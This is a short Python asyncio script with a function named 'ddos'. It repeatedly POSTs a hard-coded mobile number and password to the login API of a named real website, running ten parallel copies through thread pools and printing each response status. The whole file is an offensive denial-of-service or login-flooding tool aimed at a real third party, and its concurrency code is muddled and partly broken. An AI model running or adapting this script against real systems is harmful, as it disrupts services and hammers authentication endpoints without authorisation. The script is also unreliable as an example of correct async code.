from aiohttp import ClientSession
import random
import asyncio, uvloop
from rich import traceback
from headres import getHeaders
import json
from concurrent.futures import ThreadPoolExecutor

asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

traceback.install()



async def ddos(url: str):

    # payload = {"mobile":"998931234567","password":"pass","equipment":1}
    

    payload = {"mobile":"998931234567","password":"pass","equipment":1}


    headers = await getHeaders(url)

    async with ClientSession(base_url=url, headers=headers) as session:
        request = await session.post('api/login', json=payload) 

        print(f"{request.status}")
            # print(headers)

async def main():
    url = 'https://www.engineeredarts.net/'
    await ddos(url)

    with ThreadPoolExecutor(max_workers=10) as executor:
        loop = asyncio.get_running_loop()
        tasks = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            for _ in range(10):
                tasks.append(loop.run_in_executor(executor, asyncio.run, ddos(url)))
        await asyncio.gather(*tasks)


    # url = 'https://www.example.com'


# print(getHeaders(url))


if __name__ == "__main__":
    asyncio.run(main())
